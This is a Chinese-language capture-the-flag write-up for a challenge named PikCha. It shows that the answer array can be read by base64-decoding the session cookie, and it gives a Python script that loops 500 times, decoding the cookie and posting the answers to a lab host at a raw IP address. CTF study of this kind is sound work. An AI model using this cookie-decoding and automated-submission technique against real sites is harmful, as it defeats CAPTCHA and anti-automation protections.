PikCha

复现链接 http://104.197.195.221:8084 http://34.121.84.161:8084

这个似乎是jwt的

不过base64也可以

它的意思就是让我们提交answer数组里面的值到input框里面并且两值之间使用空格隔开，就像下面这样

然后成功次数就会加一，变成1/500

好了，用python脚本处理一下就行了

# -*- coding: utf-8 -*-#
# -------------------------------------------------------------------------------
# Name:         ctf
# Description:  复现脚本
# Author:       M4XLMUM
# Date:         2021/4/12
# -------------------------------------------------------------------------------
import requests
import base64
import json

req = requests.session()  # 保持会话session
for i in range(500):
    url = 'http://34.121.84.161:8084/'
    r = req.get(url)
    cookie = r.cookies.get_dict()['session']
    cookie = cookie.split('.')[0].encode('ascii') + b'==='   # 官方wp的解决方案，加上三个等号更好一点就不会出错了
    content = base64.b64decode(cookie)
    ans = json.loads(content)['answer']
    res = str(ans).replace('[', '').replace(']', '').replace(',', '')


    post = {
        'guess': res
    }
    pcookie = r.cookies
    response = req.post(url=url, data=post, cookies=pcookie)

    if i != 499:
        print("第{0}次".format(i+1))
    else:
        print(response.text)
